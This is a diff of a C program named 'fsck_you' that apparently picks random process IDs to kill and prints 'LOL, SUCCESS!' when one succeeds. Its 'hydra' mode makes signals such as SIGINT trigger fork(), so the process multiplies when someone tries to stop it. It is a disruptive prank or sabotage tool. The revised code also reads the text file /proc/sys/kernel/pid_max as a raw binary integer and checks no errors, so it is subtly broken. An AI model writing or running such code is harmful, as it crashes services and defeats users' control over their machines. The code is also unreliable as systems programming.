@@ -1,20 +1,22 @@
 /*
-** fsck_you.c for fsck_you in /home/admin/Documents/Programming/fsck_you
+** fsck_you.c for source in /home/admin/Documents/Programming/dvm/vm/fsck_you/source
 ** 
 ** Made by Thomas Murgia
 ** Login   <Garuda1@hotmail.fr>
 ** 
 ** Started on  Wed May 04 21:52:44 2016 Thomas Murgia
-** Last update Wed May 04 21:52:44 2016 Thomas Murgia
+** Last update Sat Jun 11 13:51:53 2016 Thomas Murgia
 */
 
-#define   _POSIX_SOURCE
+#define   _POSIX_C_SOURCE   200809L
+#define   RAND_SRC          "/dev/urandom"
+#define   MAX_PID           "/proc/sys/kernel/pid_max"
+
 #include  <sys/types.h>
-#include  <string.h>
 #include  <unistd.h>
 #include  <signal.h>
-#include  <stdlib.h>
-#include  <stdio.h>
+#include  <string.h>
+#include  <fcntl.h>
 
 typedef struct t_args t_args;
 struct t_args
@@ -23,7 +25,7 @@ struct t_args
   int   hydra;
 };
 
-void      lol(int sig)
+void      sig_handler(int sig)
 {
   fork();
   ++sig;
@@ -31,33 +33,8 @@ void      lol(int sig)
 
 void      set_signals(void)
 {
-  signal(SIGHUP, lol);
-  signal(SIGINT, lol);
-  signal(SIGQUIT, lol);
-  signal(SIGILL, lol);
-  signal(SIGTRAP, lol);
-  signal(SIGABRT, lol);
-  signal(SIGBUS, lol);
-  signal(SIGFPE, lol);
-  signal(SIGKILL, lol);
-  signal(SIGUSR1, lol);
-  signal(SIGSEGV, lol);
-  signal(SIGUSR2, lol);
-  signal(SIGPIPE, lol);
-  signal(SIGALRM, lol);
-  signal(SIGTERM, lol);
-  signal(SIGCHLD, lol);
-  signal(SIGCONT, lol);
-  signal(SIGSTOP, lol);
-  signal(SIGTSTP, lol);
-  signal(SIGTTIN, lol);
-  signal(SIGTTOU, lol);
-  signal(SIGURG, lol);
-  signal(SIGXCPU, lol);
-  signal(SIGXFSZ, lol);
-  signal(SIGVTALRM, lol);
-  signal(SIGPROF, lol);
-  signal(SIGWINCH, lol);
+  signal(SIGSEGV, sig_handler);
+  signal(SIGINT, sig_handler);
 }
 
 void      check_args(t_args *s_args, int argc, char **argv)
@@ -75,24 +52,25 @@ void      check_args(t_args *s_args, int argc, char **argv)
     }
 }
 
+void      init_args(t_args *s_args)
+{
+  s_args -> hydra = 0;
+  s_args -> silent = 0;
+}
+
 int       rand_pid(void)
 {
-  FILE    *rand_src;
-  FILE    *pid_max_src;
+  int     rand_src;
+  int     pid_max_src;
   int     pid;
   int     pid_max;
 
-  if ((rand_src = fopen("/dev/urandom", "r")) == NULL)
-    return getpid();
-  if ((pid_max_src = fopen("/proc/sys/kernel/pid_max", "r")) == NULL)
-    {
-      fclose(rand_src);
-      return getpid();
-    }
-  fread(&pid, sizeof(int), 1, rand_src);
-  fscanf(pid_max_src, "%d", &pid_max);
-  fclose(rand_src);
-  fclose(pid_max_src);
+  rand_src = open(RAND_SRC, O_RDONLY);
+  pid_max_src = open(MAX_PID, O_RDONLY);
+  read(rand_src, &pid, sizeof(int));
+  read(pid_max_src, &pid_max, sizeof(int));
+  close(rand_src);
+  close(pid_max_src);
   return (pid % pid_max);
 }
 
@@ -109,6 +87,7 @@ int       main(int argc, char **argv)
 {
   t_args  s_args;
 
+  init_args(&s_args);
   check_args(&s_args, argc, argv);
   if (s_args.hydra)
     set_signals();
@@ -121,5 +100,5 @@ int       main(int argc, char **argv)
       else if (!s_args.silent)
         my_puts("LOL, SUCCESS!\n");
     }
-  return EXIT_SUCCESS;
+  return (0);
 }
